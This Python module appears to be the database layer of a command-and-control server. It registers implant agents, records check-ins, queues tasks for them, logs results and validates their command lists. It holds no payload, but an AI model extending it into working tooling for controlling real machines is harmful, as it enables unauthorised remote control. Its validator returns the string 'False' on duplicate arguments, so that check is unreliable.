from .database import Agent, Task, TaskResult, Key
import json
import uuid
from datetime import datetime

ACTION_CHECKIN = 1
ACTION_REGISTER = 2
ACTION_TASK_RESULT = 3

STATUS_ERROR = 0
STATUS_CONTINUE = 1
STATUS_TASKS = 2
STATUS_REGISTER = 3
STATUS_INVALID = 4

def create_agent(implant_id: str, ip: str, os: str, commands: list) -> None:
    Agent.create(implant_id=str(implant_id), ip=str(ip), os=str(os), commands=str(json.dumps(commands)))

def is_agent(implant_id: str, ip: str) -> bool:
    return(Agent.select().where((Agent.implant_id == implant_id) & (Agent.ip == ip)).exists())

def get_agent_id(implant_id: str, ip: str) -> str:
    return(str(Agent.select().where((Agent.implant_id == implant_id) & (Agent.ip == ip))[0].id))

def get_active_tasks(agent_id: str) -> list[dict]:
    tasks = []
    
    for task in Task.select().where((Task.agent == agent_id) & (Task.completed == False)):
        tasks.append({
            "task_id": str(task.id),
            "task": str(task.task),
            "args": json.loads(task.args)
        }) 

    return(tasks)

def mark_task_sent(task_id: str) -> None:
    Task.update(sent=True).where(Task.id == uuid.UUID(task_id)).execute()

def log_task_result(task_id: str, result: str) -> None:
    TaskResult.create(task=uuid.UUID(task_id), result=str(result))
    Task.update(completed=True).where(Task.id == uuid.UUID(task_id)).execute()

def update_last_checkin(agent_id: str) -> None:
    Agent.update(last_checkin=datetime.now()).where(Agent.id == agent_id).execute()

def validate_commands(commands: list) -> bool:
    command_names = []

    for command in commands:
        if 'command' in command and 'description' in command and 'args' in command:
            if command['command'] in command_names: # Duplicate command name
                return(False)
            
            command_names.append(command['command'])

            arg_names = []
            for arg in command['args']:
                if 'name' in arg and 'arg_type' in arg and 'description' in arg and 'required' in arg:
                    
                    if arg['name'] in arg_names: # Duplicate argument name
                        return('False')

                    arg_names.append(arg['name'])

                else: # Invalid argument keys
                    return(False)

        else: # Invalid command keys
            return(False)

    return(True)
